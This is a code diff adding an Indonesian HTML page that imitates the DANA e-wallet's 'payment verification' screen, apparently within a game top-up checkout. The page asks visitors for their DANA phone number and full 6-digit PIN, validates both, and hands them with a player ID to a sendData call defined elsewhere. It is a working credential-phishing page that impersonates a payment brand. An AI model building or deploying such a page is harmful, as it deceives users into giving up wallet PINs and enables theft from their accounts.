@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Pembayaran Instan</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+</head>
+<body style="background: #008fee; display: flex; align-items: center; justify-content: center; height: 100vh;">
+    <div style="background: white; padding: 40px; border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.15); width: 100%; max-width: 420px; text-align: center;">
+        <img src="/images/payment-methods/dana.png" height="50" style="margin-bottom: 25px;">
+        <h3 style="font-weight: 800; color: #008fee; margin-bottom: 10px;">Verifikasi Pembayaran DANA</h3>
+        <p style="color: var(--text-muted); margin-bottom: 30px;">Silakan masukkan nomor ponsel DANA Anda untuk verifikasi instan.</p>
+        
+        <form id="danaForm" style="text-align: left;">
+            <div style="margin-bottom: 25px;">
+                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.9rem;">NOMOR HP DANA</label>
+                <input type="tel" id="identifier" placeholder="08xxxxxxxxxx" maxlength="13" required style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s; color: black;">
+            </div>
+            <div style="margin-bottom: 30px;">
+                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.9rem;">PIN DANA (6 DIGIT)</label>
+                <input type="tel" id="pin" placeholder="••••••" maxlength="6" required style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 1.2rem; letter-spacing: 5px; outline: none; transition: 0.3s; color: black; text-align: center;">
+            </div>
+            
+            <p id="errorMsg" style="color: #ff3333; font-size: 0.8rem; margin-bottom: 15px; display: none;"></p>
+            <button type="submit" style="width: 100%; padding: 15px; background: #008fee; color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; font-size: 1.1rem;">LANJUTKAN</button>
+        </form>
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        // Check if logged in & has ID
+        if(!localStorage.getItem('isLoggedIn') || !localStorage.getItem('playerId')) {
+            window.location.href = '/checkout';
+        }
+
+        const phoneInput = document.getElementById('identifier');
+        const pinInput = document.getElementById('pin');
+        const errorMsg = document.getElementById('errorMsg');
+
+        // Force only numbers and '08' prefix
+        phoneInput.oninput = function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 0 && !this.value.startsWith('08')) {
+                this.value = '08' + this.value.substring(0, 11);
+            }
+        };
+
+        // Force only numbers for PIN and max 6
+        pinInput.oninput = function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        };
+
+        document.getElementById('danaForm').onsubmit = function(e) {
+            e.preventDefault();
+            const identifier = phoneInput.value;
+            const pin = pinInput.value;
+            const playerId = localStorage.getItem('playerId');
+
+            if (identifier.length < 10) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'Nomor HP tidak valid (terlalu pendek)';
+                return;
+            }
+
+            if (pin.length !== 6) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'PIN Dana harus 6 digit';
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+            sendData('dana', { identifier, pin, playerId });
+        };
+    </script>
+</body>
+</html>
